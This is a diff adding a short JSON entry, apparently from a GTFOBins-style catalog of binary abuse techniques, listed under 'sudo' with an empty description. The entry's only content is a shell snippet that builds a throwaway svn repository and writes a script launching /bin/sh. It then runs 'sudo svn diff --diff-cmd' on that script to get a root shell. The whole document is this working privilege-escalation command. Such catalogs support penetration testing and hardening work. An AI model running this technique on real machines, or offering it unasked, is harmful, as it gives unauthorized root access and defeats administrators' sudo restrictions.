@@ -1,0 +1,10 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        "description": "",
+        "code": "TD=$(mktemp -d)\nsvnadmin create $TD/pwn\nsvn checkout file:///$TD/pwn $TD/project\necho -e '#!/bin/bash\\n/bin/sh' > $TD/shell\nchmod +x $TD/shell\nsudo svn diff --diff-cmd \"$TD/shell\"\n"
+      }
+    ]
+  }
+}
